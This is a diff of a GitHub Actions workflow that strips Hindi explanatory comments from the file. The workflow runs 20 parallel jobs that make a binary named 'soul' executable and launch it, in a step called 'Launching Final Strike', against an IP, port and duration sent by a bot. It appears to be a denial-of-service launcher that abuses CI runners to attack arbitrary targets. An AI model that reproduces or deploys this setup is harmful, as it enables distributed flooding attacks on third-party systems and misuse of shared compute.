@@ -10,7 +10,6 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        # 20 parallel servers ek saath chalenge
         session: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     
     steps:
@@ -18,10 +17,8 @@ jobs:
         uses: actions/checkout@v4
 
       - name: Set permissions
-        # Yeh line aapki 'soul' file ko chalne layak banayegi
         run: chmod +x soul
 
       - name: Launching Final Strike
-        # Yeh line aapki binary ko bot se aayi IP/Port par chalayegi
         run: ./soul ${{ github.event.client_payload.ip }} ${{ github.event.client_payload.port }} ${{ github.event.client_payload.time }}
         
